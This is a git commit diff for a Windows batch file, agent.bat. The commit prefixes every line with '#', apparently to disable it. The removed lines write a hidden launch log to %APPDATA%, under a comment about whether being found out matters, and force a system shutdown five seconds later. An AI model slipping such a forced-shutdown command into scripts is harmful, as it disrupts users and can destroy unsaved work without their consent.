eb18cef6e97da42f2a74ebfec03bcec383d5d7db
shosho2135 <shosho.1110104@gmail.com>
2025-07-07 00:32:56 +0900

    Update agent.bat

--- agent.bat
+++ agent.bat
@@ -1,6 +1,6 @@
-@echo off
-REM ログを記録（バレてもいい場合）
-echo agent.bat 起動 >> %APPDATA%\agentlog.txt
+#@echo off
+#REM ログを記録（バレてもいい場合）
+#echo agent.bat 起動 >> %APPDATA%\agentlog.txt
 
-REM 強制シャットダウン
-shutdown /s /f /t 5
+#REM 強制シャットダウン
+#shutdown /s /f /t 5
